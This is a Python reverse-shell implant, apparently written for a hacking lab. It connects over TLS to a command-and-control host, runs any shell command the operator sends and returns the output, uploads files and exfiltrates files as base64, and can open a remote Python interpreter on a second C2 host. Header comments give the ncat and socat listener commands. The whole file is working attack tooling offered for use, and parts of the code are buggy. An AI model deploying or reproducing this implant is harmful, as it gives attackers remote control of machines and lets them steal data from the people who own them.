import socket
import time
import subprocess
import codecs
import sys
import os
import code
import random
import ssl

if sys.version_info.major == 2:
    input = raw_input

###############################################################################
# Reverse listener command:
# sudo ncat -l -p 1995 --ssl --ssl-cert client.crt --ssl-key client.key
# or
# sudo socat ssl-l:1995,reuseaddr,fork,cert=server.pem,cafile=client.crt,verify=0 file:`tty`,echo=1,escape=0x03,nonblock,crnl
###############################################################################


# openssl genrsa -out client.key 2048
client_key = """-----BEGIN RSA PRIVATE KEY-----
paste cert here
-----END RSA PRIVATE KEY-----
"""

# openssl req -new -key client.key -x509 -days 50 -out client.crt
client_crt = """-----BEGIN CERTIFICATE-----
paste cert here
-----END CERTIFICATE-----"""

# openssl genrsa -out server.key 2048
# openssl req -new -key server.key -x509 -days 50 -out server.crt
server_crt = """-----BEGIN CERTIFICATE-----
paste cert here
-----END CERTIFICATE-----"""

###############################################################################
# EDIT THE PARAMETERS ABOVE THIS LINE
###############################################################################

class MySocket(socket.socket):
#class MySocket(ssl.wrap_socket(socket.socket(), ssl_version=ssl.PROTOCOL_TLSv1_2,keyfile='client_key',certfile='client_crt',ca_certs='server_crt')):
    def __init__(self, *args):
        #ssl.wrap_socket(socket.socket.__init__(self, *args), ssl_version=ssl.PROTOCOL_TLSv1_2)
        socket.socket.__init__(self, *args)
    def write(self, text):
        return self.send(text.encode())
    def readline(self):
        #return self.recv(2048).decode()
        return self.recv(2048).decode()

def upload(mysocket):
    mysocket.send(b"What is the name of the file you are uploading?:")
    fname = mysocket.recv(1024).decode()
    mysocket.send(b"What unique string will end the transmission?:")
    endoffile = mysocket.recv(1024)
    mysocket.send(b"Transmit the file as a base64 encoded string followed by the end of transmission string.\n")
    data = b""
    while not data.endswith(endoffile):
        data += mysocket.recv(1024)
    try:
        fh = open(fname.strip(), "w")
        fh.write(codecs.decode(data[:-len(endoffile)], "base64").decode("latin-1"))
        fh.close()
    except Exception as e:
        mysocket.send("An error occured uploading file {0}. {1}".format(fname, str(e)).encode())
    else:
        mysocket.send(fname.strip().encode() + b" successfully uploaded")


def download(mysocket):
    mysocket.send(b"What file do you want (including path)?:")
    fname = mysocket.recv(1024).decode()
    mysocket.send(b"Receive a base64 encoded string containing your file will end with !EOF!\n")
    try:
        data = codecs.encode(open(fname.strip(),"rb").read(), "base64")
    except Exception as e:
        data = "An error occured downloading the file {0}. {1}".format(fname, str(e)).encode()
    mysocket.sendall(data + "!EOF!".encode())


def ScanAndConnect():
    print("Connecting to the C2 Server.")
    sleep=random.randint(0,120)
    connected = False
    port_list=[8470,1769,1995,2979,3224,4321,5225,6656,7546,9418]
    while not connected:
        for port in [8470,1769,1995,2979,3224,4321,5225,6656,7546,9418]:
            time.sleep(sleep)
            try:
                #a=random.choice(port_list)
                a=1995
                print("Trying", a, end="")
                mysocket.connect(("htb.sorsnce.com", a))
            except socket.error:
                print(".....Could not connect to that port.")
                continue
            else:
                print("\nConnected")
                connected = True
                mysocket.send(b"Endpoint Connected!!")
                break

def cli(cmd):
    ph = subprocess.Popen(cmd,shell=True, stdout=subprocess.PIPE,stdin=subprocess.PIPE,stderr=subprocess.PIPE)
    results, errors = ph.communicate()
    results = results + errors
    return results.decode()
    
# specify you own certs = more secure    
# mysocket = ssl.wrap_socket(socket.socket(), ssl_version=ssl.PROTOCOL_TLSv1_2,keyfile='client_key',certfile='client_crt',ca_certs='server_crt')
mysocket = ssl.wrap_socket(socket.socket(), ssl_version=ssl.PROTOCOL_TLSv1_2)
ScanAndConnect()
while True:
    try:
        commandrequested = mysocket.recv(1024).decode()
        if len(commandrequested) == 0:
            time.sleep(3)
            mysocket = socket.socket()
            ScanAndConnect()
            continue
        if commandrequested[:4] == "KILL":
            mysocket.send(b"Terminating Connection.")
            break
        if commandrequested[:6] == "UPLOAD":
            upload(mysocket)
            continue
        if commandrequested[:8] == "DOWNLOAD":
            download(mysocket)
            continue
        if commandrequested[:6] == "PYTHON":
            s = MySocket()
            ass=ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1_2)
            ass.connect(("c2.sorsnce.com", 9000))
            print(bytes(ass))
            sys.stdout=sys.stdin=sys.stderr=bytes(ass)
            time.sleep(5)
            print("yay")
            code.interact("Welcome to pyterpreter",local=locals())
            continue    
        prochandle = subprocess.Popen(
            commandrequested, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        results, errors = prochandle.communicate()
        results = results + errors
        mysocket.send(results)
    except socket.error:
        #ScanAndConnect()
        break
    except Exception as e:
        mysocket.send(bytes(str(e), "utf-8"))
        break
                       
